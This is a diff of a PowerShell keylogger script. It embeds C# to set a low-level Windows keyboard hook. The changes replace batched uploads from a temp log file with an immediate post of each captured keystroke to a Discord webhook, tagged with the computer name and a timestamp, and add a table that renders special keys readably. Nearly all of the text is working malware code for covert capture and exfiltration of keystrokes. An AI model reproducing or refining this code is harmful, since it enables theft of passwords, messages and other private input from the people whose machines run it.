@@ -7,10 +7,45 @@ if (-not $webhook) {
     exit
 }
 
-$logfile = "$env:TEMP\keystrokes.log"
-$interval = 60  # Time in seconds to send logs to Discord
+$pcName = $env:COMPUTERNAME  # Get PC name
 
-# Create low-level keyboard hook
+# Define key replacements for special keys
+$specialKeys = @{
+    "RETURN" = "[ENTER]"
+    "SPACE" = "[SPACE]"
+    "BACK" = "[BACKSPACE]"
+    "TAB" = "[TAB]"
+    "CAPITAL" = "[CAPS_LOCK]"
+    "SHIFTKEY" = "[SHIFT]"
+    "CONTROLKEY" = "[CTRL]"
+    "MENU" = "[ALT]"
+    "ESCAPE" = "[ESC]"
+    "LEFT" = "[LEFT_ARROW]"
+    "RIGHT" = "[RIGHT_ARROW]"
+    "UP" = "[UP_ARROW]"
+    "DOWN" = "[DOWN_ARROW]"
+    "DELETE" = "[DEL]"
+    "INSERT" = "[INSERT]"
+    "HOME" = "[HOME]"
+    "END" = "[END]"
+    "ADD" = "[PLUS]"
+    "SUBTRACT" = "[MINUS]"
+    "MULTIPLY" = "[STAR]"
+    "DIVIDE" = "[SLASH]"
+    "OEM_1" = "[SEMICOLON]"
+    "OEM_PLUS" = "[EQUAL]"
+    "OEM_COMMA" = "[COMMA]"
+    "OEM_MINUS" = "[DASH]"
+    "OEM_PERIOD" = "[DOT]"
+    "OEM_2" = "[FORWARD_SLASH]"
+    "OEM_3" = "[TILDE]"
+    "OEM_4" = "[LEFT_BRACKET]"
+    "OEM_5" = "[BACKSLASH]"
+    "OEM_6" = "[RIGHT_BRACKET]"
+    "OEM_7" = "[QUOTE]"
+}
+
+# Create keyboard hook
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -30,6 +65,8 @@ public class KeyboardHook {
     private static LowLevelKeyboardProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
 
+    public static event Action<string> OnKeyPressed;
+
     public static void Start() {
         _hookID = SetHook(_proc);
         Application.Run();
@@ -46,28 +83,26 @@ public class KeyboardHook {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
-            System.IO.File.AppendAllText(@"$env:TEMP\keystrokes.log", ((Keys)vkCode).ToString() + " ");
+            string key = ((Keys)vkCode).ToString();
+            OnKeyPressed?.Invoke(key);
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
 }
 "@ -Language CSharp
 
-[KeyboardHook]::Start() | Out-Null
+# Function to send each keystroke to Discord
+function Send-KeyToDiscord {
+    param ([string]$key)
+    
+    $time = Get-Date -Format "HH:mm:ss"  # Get current time
+    $formattedKey = if ($specialKeys.ContainsKey($key)) { $specialKeys[$key] } else { $key }
+    $message = "[$pcName] - [$time] : $formattedKey"
 
-# Function to send logs to Discord
-function Send-Logs {
-    while ($true) {
-        Start-Sleep -Seconds $interval
-        if (Test-Path $logfile) {
-            $content = Get-Content $logfile -Raw
-            if ($content) {
-                Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body (@{content=$content} | ConvertTo-Json)
-                Clear-Content $logfile
-            }
-        }
-    }
+    $json = @{content=$message} | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $json
 }
 
-# Run in background
-Start-Job -ScriptBlock ${function:Send-Logs}
+# Attach event to send keylogs
+[KeyboardHook]::OnKeyPressed = { param ($key) Send-KeyToDiscord $key }
+[KeyboardHook]::Start() | Out-Null
